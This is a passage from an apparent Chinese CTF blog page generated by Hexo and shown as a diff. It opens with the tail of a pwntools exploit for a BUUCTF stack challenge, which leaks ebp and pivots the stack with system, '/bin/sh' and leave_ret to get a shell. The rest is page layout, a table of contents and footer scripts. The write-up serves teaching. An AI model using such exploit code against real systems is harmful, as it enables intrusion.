class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>p.recvline()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+<span class="hljs-string">&#x27;dead&#x27;</span>+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/04/07/2021-04-07-buu03/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;04&#x2F;07&#x2F;2021-04-07-buu03&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;04&#x2F;07&#x2F;2021-04-07-buu03&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+          <section class="donate">
+  <div id="qrcode-donate">
+    <img   class="lazyload" data-original="https://pic.izhaoo.com/alipay.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >
+  </div>
+  <div class="icon">
+    <a href="javascript:;" id="alipay"><i class="iconfont iconalipay"></i></a>
+    <a href="javascript:;" id="wechat"><i class="iconfont iconwechat-fill"></i></a>
+  </div>
+</section>
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/"><i class="iconfont iconleft"></i>初探堆</a>
+    <a href="/2021/04/05/2021-04-05-buu02/">buu02<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buu%E2%80%94%E2%80%94pwn%E5%AD%A6%E4%B9%A0"><span class="toc-text">buu——pwn学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E3%80%81%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="toc-text">十、铁人三项(第五赛区)_2018_rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E4%B8%80%E3%80%81gyctf-2020-borrowstack"><span class="toc-text">十一、gyctf_2020_borrowstack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81bjdctf-2020-babyrop"><span class="toc-text">十二、bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E4%B8%89%E3%80%81others-shellcode"><span class="toc-text">十三、others_shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81pwn2-sctf-2016"><span class="toc-text">十四、pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E4%BA%94%E3%80%81ciscn-2019-s-3"><span class="toc-text">十五、ciscn_2019_s_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E3%80%81ciscn-2019-es-2"><span class="toc-text">十六、ciscn_2019_es_2</span></a></li></ol></li></ol></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=894519210 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://github.com/zhaoo "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:izhaoo@163.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
